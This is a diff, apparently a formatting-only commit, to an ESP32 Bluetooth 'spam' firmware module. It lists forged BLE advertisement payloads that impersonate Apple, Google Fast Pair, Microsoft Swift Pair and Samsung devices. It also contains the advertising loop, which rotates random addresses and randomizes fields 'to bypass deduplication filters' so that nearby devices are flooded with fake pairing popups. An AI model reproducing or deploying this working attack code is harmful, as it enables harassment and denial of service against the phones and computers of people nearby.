@@ -23,12 +23,13 @@ static volatile esp_bt_status_t last_event_status = ESP_BT_STATUS_SUCCESS;
 static bt_spam_mode_t current_mode = BT_SPAM_MODE_ALL;
 
 /*
- * ADV_TYPE_IND (connectable undirected advertising) allows adv_int down to 20ms (0x20)
- * and is required for Apple proximity/continuity modals, Android Fast Pair, and Windows Swift Pair.
+ * ADV_TYPE_IND (connectable undirected advertising) allows adv_int down to 20ms
+ * (0x20) and is required for Apple proximity/continuity modals, Android Fast
+ * Pair, and Windows Swift Pair.
  */
 static esp_ble_adv_params_t ble_adv_params = {
-    .adv_int_min = 0x20,  /* 20ms */
-    .adv_int_max = 0x30,  /* 30ms */
+    .adv_int_min = 0x20, /* 20ms */
+    .adv_int_max = 0x30, /* 30ms */
     .adv_type = ADV_TYPE_IND,
     .own_addr_type = BLE_ADDR_TYPE_RANDOM,
     .channel_map = ADV_CHNL_ALL,
@@ -61,146 +62,161 @@ typedef struct {
  *   Buds:  [1b ff 75 00] 42 09 81 02 14 15 03 21 01 09 <a> <b> 01 <c>
  *                        06 3c 94 8e 00 00 00 00 c7 00
  */
-#define SPAM_SAMSUNG_WATCH(id, model_name)                             \
-    {                                                                  \
-        .name = model_name,                                            \
-        .type = SPAM_TYPE_SAMSUNG_SETUP,                               \
-        .len = 15,                                                     \
-        .data = {0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00,       \
-                 0x01, 0x01, 0xff, 0x00, 0x00, 0x43, id},              \
-    }
+#define SPAM_SAMSUNG_WATCH(id, model_name)                                 \
+  {                                                                        \
+      .name = model_name,                                                  \
+      .type = SPAM_TYPE_SAMSUNG_SETUP,                                     \
+      .len = 15,                                                           \
+      .data = {0x0e, 0xff, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, \
+               0xff, 0x00, 0x00, 0x43, id},                                \
+  }
 
-#define SPAM_SAMSUNG_BUDS(a, b, c, model_name)                         \
-    {                                                                  \
-        .name = model_name,                                            \
-        .type = SPAM_TYPE_SAMSUNG_SETUP,                               \
-        .len = 28,                                                     \
-        .data = {0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02,       \
-                 0x14, 0x15, 0x03, 0x21, 0x01, 0x09, a, b, 0x01, c,    \
-                 0x06, 0x3c, 0x94, 0x8e, 0x00, 0x00, 0x00, 0x00,       \
-                 0xc7, 0x00},                                          \
-    }
+#define SPAM_SAMSUNG_BUDS(a, b, c, model_name)                             \
+  {                                                                        \
+      .name = model_name,                                                  \
+      .type = SPAM_TYPE_SAMSUNG_SETUP,                                     \
+      .len = 28,                                                           \
+      .data = {0x1b, 0xff, 0x75, 0x00, 0x42, 0x09, 0x81, 0x02, 0x14, 0x15, \
+               0x03, 0x21, 0x01, 0x09, a,    b,    0x01, c,    0x06, 0x3c, \
+               0x94, 0x8e, 0x00, 0x00, 0x00, 0x00, 0xc7, 0x00},            \
+  }
 
 static const spam_model_t spam_models[] = {
     /* =========================================================================
      * 1. APPLE PROXIMITY PAIRING (AirPods, Beats) - Type 0x07
-     * ========================================================================= */
+     * =========================================================================
+     */
     {
         .name = "Apple AirPods 1",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Apple AirPods 2",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Apple AirPods 3",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Apple AirPods Pro",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Apple AirPods Pro 2",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Apple AirPods Max",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Powerbeats",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x03,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Powerbeats Pro",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Beats Solo Pro",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0c,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Beats Studio Buds",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Beats Flex",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x10,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Beats Studio Pro",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x17,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Beats Fit Pro",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
     {
         .name = "Beats Studio Buds+",
         .type = SPAM_TYPE_APPLE_PROXIMITY,
         .len = 31,
-        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75,
-                 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
-                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
+        .data = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16,
+                 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
+                 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
+                 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
     },
 
     /* =========================================================================
      * 2. APPLE CONTINUITY / NEARBY ACTION MODALS - Type 0x10
-     * ========================================================================= */
+     * =========================================================================
+     */
     {
         .name = "AppleTV Setup",
         .type = SPAM_TYPE_APPLE_ACTION,
@@ -259,8 +275,10 @@ static const spam_model_t spam_models[] = {
     },
 
     /* =========================================================================
-     * 3. GOOGLE FAST PAIR (Android) - Service UUID 0xFE2C + TxPower Level (-21 dBm)
-     * ========================================================================= */
+     * 3. GOOGLE FAST PAIR (Android) - Service UUID 0xFE2C + TxPower Level (-21
+     * dBm)
+     * =========================================================================
+     */
     {
         .name = "Google Pixel Buds",
         .type = SPAM_TYPE_GOOGLE_FAST_PAIR,
@@ -333,39 +351,42 @@ static const spam_model_t spam_models[] = {
     },
 
     /* =========================================================================
-     * 4. MICROSOFT SWIFT PAIR (Windows 10 / 11) - Appearance (0x19) + Beacon (0x03) + Name (0x09)
-     * ========================================================================= */
+     * 4. MICROSOFT SWIFT PAIR (Windows 10 / 11) - Appearance (0x19) + Beacon
+     * (0x03) + Name (0x09)
+     * =========================================================================
+     */
     {
         .name = "MS Surface Mouse",
         .type = SPAM_TYPE_MICROSOFT_SWIFT,
         .len = 29,
         .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc2, 0x03, 0x06, 0xff, 0x06,
-                 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09, 'S', 'u', 'r', 'f',
-                 'a', 'c', 'e', ' ', 'M', 'o', 'u', 's', 'e'},
+                 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09, 'S',  'u',  'r',  'f',
+                 'a',  'c',  'e',  ' ',  'M',  'o',  'u',  's',  'e'},
     },
     {
         .name = "MS Surface Keyboard",
         .type = SPAM_TYPE_MICROSOFT_SWIFT,
         .len = 27,
-        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc1, 0x03, 0x06, 0xff, 0x06,
-                 0x00, 0x03, 0x00, 0x80, 0x0c, 0x09, 'S', 'u', 'r', 'f',
-                 'a', 'c', 'e', ' ', 'K', 'b', 'd'},
+        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc1, 0x03, 0x06, 0xff,
+                 0x06, 0x00, 0x03, 0x00, 0x80, 0x0c, 0x09, 'S',  'u',
+                 'r',  'f',  'a',  'c',  'e',  ' ',  'K',  'b',  'd'},
     },
     {
         .name = "MS Surface Audio",
         .type = SPAM_TYPE_MICROSOFT_SWIFT,
         .len = 29,
         .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0x42, 0x08, 0x06, 0xff, 0x06,
-                 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09, 'S', 'u', 'r', 'f',
-                 'a', 'c', 'e', ' ', 'A', 'u', 'd', 'i', 'o'},
+                 0x00, 0x03, 0x00, 0x80, 0x0e, 0x09, 'S',  'u',  'r',  'f',
+                 'a',  'c',  'e',  ' ',  'A',  'u',  'd',  'i',  'o'},
     },
     {
         .name = "Xbox Controller",
         .type = SPAM_TYPE_MICROSOFT_SWIFT,
         .len = 31,
-        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc4, 0x03, 0x06, 0xff, 0x06,
-                 0x00, 0x03, 0x00, 0x80, 0x10, 0x09, 'X', 'b', 'o', 'x',
-                 ' ', 'C', 'o', 'n', 't', 'r', 'o', 'l', 'l', 'e', 'r'},
+        .data = {0x02, 0x01, 0x06, 0x03, 0x19, 0xc4, 0x03, 0x06,
+                 0xff, 0x06, 0x00, 0x03, 0x00, 0x80, 0x10, 0x09,
+                 'X',  'b',  'o',  'x',  ' ',  'C',  'o',  'n',
+                 't',  'r',  'o',  'l',  'l',  'e',  'r'},
     },
 
     /* =========================================================================
@@ -373,7 +394,8 @@ static const spam_model_t spam_models[] = {
      * Watch = baliza Galaxy Watch (popup "Como conectar tu reloj");
      * Buds  = EasySetup de auriculares (popup de emparejamiento Buds).
      * IDs genuinos de Flipper-XFW easysetup.c / simondankelmann.
-     * ========================================================================= */
+     * =========================================================================
+     */
     SPAM_SAMSUNG_WATCH(0x1a, "Fallback Watch"),
     SPAM_SAMSUNG_WATCH(0x01, "White W4 Classic 44mm"),
     SPAM_SAMSUNG_WATCH(0x02, "Black W4 Classic 40mm"),
@@ -471,29 +493,32 @@ static uint8_t prepare_payload(int index, uint8_t* out_buffer) {
   uint8_t len = model->len;
   memcpy(out_buffer, model->data, len);
 
-  /* Dynamic randomization of ephemeral fields to bypass deduplication filters */
+  /* Dynamic randomization of ephemeral fields to bypass deduplication filters
+   */
   switch (model->type) {
     case SPAM_TYPE_APPLE_PROXIMITY:
-      /* Randomize Lid counter / sequence (byte 11) and Auth tag (bytes 15-18) */
-      out_buffer[11] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[15] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[16] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[17] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[18] = (uint8_t)(esp_random() & 0xFF);
+      /* Randomize Lid counter / sequence (byte 11) and Auth tag (bytes 15-18)
+       */
+      out_buffer[11] = (uint8_t) (esp_random() & 0xFF);
+      out_buffer[15] = (uint8_t) (esp_random() & 0xFF);
+      out_buffer[16] = (uint8_t) (esp_random() & 0xFF);
+      out_buffer[17] = (uint8_t) (esp_random() & 0xFF);
+      out_buffer[18] = (uint8_t) (esp_random() & 0xFF);
       break;
 
     case SPAM_TYPE_APPLE_ACTION:
       /* Randomize auth bytes (bytes 9-14) */
-      out_buffer[9] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[10] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[11] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[12] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[13] = (uint8_t)(esp_random() & 0xFF);
-      out_buffer[14] = (uint8_t)(esp_random() & 0xFF);
+      out_buffer[9] = (uint8_t) (esp_random() & 0xFF);
+      out_buffer[10] = (uint8_t) (esp_random() & 0xFF);
+      out_buffer[11] = (uint8_t) (esp_random() & 0xFF);
+      out_buffer[12] = (uint8_t) (esp_random() & 0xFF);
+      out_buffer[13] = (uint8_t) (esp_random() & 0xFF);
+      out_buffer[14] = (uint8_t) (esp_random() & 0xFF);
       break;
 
     case SPAM_TYPE_MICROSOFT_SWIFT:
-      /* In Swift Pair with Appearance: byte 13 is reserved RSSI byte, byte 12 is subscenario */
+      /* In Swift Pair with Appearance: byte 13 is reserved RSSI byte, byte 12
+       * is subscenario */
       break;
 
     case SPAM_TYPE_SAMSUNG_SETUP:
@@ -512,14 +537,16 @@ static uint8_t prepare_payload(int index, uint8_t* out_buffer) {
 
 /*
  * GAP callback. All BLE operations are asynchronous in Bluedroid.
- * The semaphore adv_sem synchronizes the control task with GAP completion events.
+ * The semaphore adv_sem synchronizes the control task with GAP completion
+ * events.
  */
 static void esp_gap_cb(esp_gap_ble_cb_event_t event,
                        esp_ble_gap_cb_param_t* param) {
   switch (event) {
     case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
       last_event_status = param->adv_data_raw_cmpl.status;
-      if (expected_event == ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT && adv_sem != NULL) {
+      if (expected_event == ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT &&
+          adv_sem != NULL) {
         xSemaphoreGive(adv_sem);
       }
       break;
@@ -529,7 +556,8 @@ static void esp_gap_cb(esp_gap_ble_cb_event_t event,
       if (last_event_status == ESP_BT_STATUS_SUCCESS) {
         is_advertising_active = true;
       }
-      if (expected_event == ESP_GAP_BLE_ADV_START_COMPLETE_EVT && adv_sem != NULL) {
+      if (expected_event == ESP_GAP_BLE_ADV_START_COMPLETE_EVT &&
+          adv_sem != NULL) {
         xSemaphoreGive(adv_sem);
       }
       break;
@@ -537,14 +565,16 @@ static void esp_gap_cb(esp_gap_ble_cb_event_t event,
     case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
       last_event_status = param->adv_stop_cmpl.status;
       is_advertising_active = false;
-      if (expected_event == ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT && adv_sem != NULL) {
+      if (expected_event == ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT &&
+          adv_sem != NULL) {
         xSemaphoreGive(adv_sem);
       }
       break;
 
     case ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT:
       last_event_status = param->set_rand_addr_cmpl.status;
-      if (expected_event == ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT && adv_sem != NULL) {
+      if (expected_event == ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT &&
+          adv_sem != NULL) {
         xSemaphoreGive(adv_sem);
       }
       break;
@@ -558,10 +588,12 @@ static void esp_gap_cb(esp_gap_ble_cb_event_t event,
 }
 
 /*
- * Robust zero-latency GAP helper: drains stale semaphores and sets expected_event
- * BEFORE dispatching the asynchronous API call.
+ * Robust zero-latency GAP helper: drains stale semaphores and sets
+ * expected_event BEFORE dispatching the asynchronous API call.
  */
-static bool execute_gap_step(esp_err_t err, esp_gap_ble_cb_event_t evt, TickType_t timeout) {
+static bool execute_gap_step(esp_err_t err,
+                             esp_gap_ble_cb_event_t evt,
+                             TickType_t timeout) {
   if (err != ESP_OK || adv_sem == NULL) {
     expected_event = 0;
     return false;
@@ -593,7 +625,8 @@ static void start_adv(void* pvParameters) {
       xSemaphoreTake(adv_sem, 0);
       expected_event = ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT;
       esp_err_t ret = esp_ble_gap_stop_advertising();
-      execute_gap_step(ret, ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT, pdMS_TO_TICKS(50));
+      execute_gap_step(ret, ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT,
+                       pdMS_TO_TICKS(50));
       is_advertising_active = false;
     }
 
@@ -607,7 +640,8 @@ static void start_adv(void* pvParameters) {
     xSemaphoreTake(adv_sem, 0);
     expected_event = ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT;
     esp_err_t ret = esp_ble_gap_set_rand_addr(rand_addr);
-    execute_gap_step(ret, ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT, pdMS_TO_TICKS(50));
+    execute_gap_step(ret, ESP_GAP_BLE_SET_STATIC_RAND_ADDR_EVT,
+                     pdMS_TO_TICKS(50));
 
     if (!running_task) {
       break;
@@ -620,7 +654,8 @@ static void start_adv(void* pvParameters) {
     xSemaphoreTake(adv_sem, 0);
     expected_event = ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT;
     ret = esp_ble_gap_config_adv_data_raw(payload_buffer, payload_len);
-    execute_gap_step(ret, ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT, pdMS_TO_TICKS(50));
+    execute_gap_step(ret, ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT,
+                     pdMS_TO_TICKS(50));
 
     if (!running_task) {
       break;
@@ -635,7 +670,8 @@ static void start_adv(void* pvParameters) {
     xSemaphoreTake(adv_sem, 0);
     expected_event = ESP_GAP_BLE_ADV_START_COMPLETE_EVT;
     ret = esp_ble_gap_start_advertising(&ble_adv_params);
-    execute_gap_step(ret, ESP_GAP_BLE_ADV_START_COMPLETE_EVT, pdMS_TO_TICKS(50));
+    execute_gap_step(ret, ESP_GAP_BLE_ADV_START_COMPLETE_EVT,
+                     pdMS_TO_TICKS(50));
 
     /* 7. Dwell for ~250ms in 50ms slices for fast exit response */
     for (int i = 0; i < 5 && running_task; i++) {
@@ -729,7 +765,7 @@ void bt_spam_app_stop(void) {
 
   /* Wait for task to exit cleanly */
   if (adv_task_handle != NULL) {
-    uint8_t retries = 50;  /* 50 x 10ms = 500ms max wait */
+    uint8_t retries = 50; /* 50 x 10ms = 500ms max wait */
     while (adv_task_handle != NULL && retries-- > 0) {
       vTaskDelay(pdMS_TO_TICKS(10));
     }
@@ -749,5 +785,3 @@ void bt_spam_app_stop(void) {
     adv_sem = NULL;
   }
 }
-
-
